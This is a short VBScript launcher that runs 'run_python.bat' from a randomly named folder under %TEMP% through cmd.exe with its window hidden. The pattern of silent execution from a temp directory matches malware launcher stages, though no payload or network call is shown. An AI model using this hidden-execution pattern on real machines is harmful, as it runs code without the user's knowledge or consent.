Set WshShell = CreateObject("WScript.Shell")

' Define the path to the batch file in the temp folder
batch_file_path = WshShell.ExpandEnvironmentStrings("%TEMP%\Xurhf82819\run_python.bat")

' Run the batch file using cmd.exe
WshShell.Run "cmd.exe /c " & batch_file_path & " & exit", 0
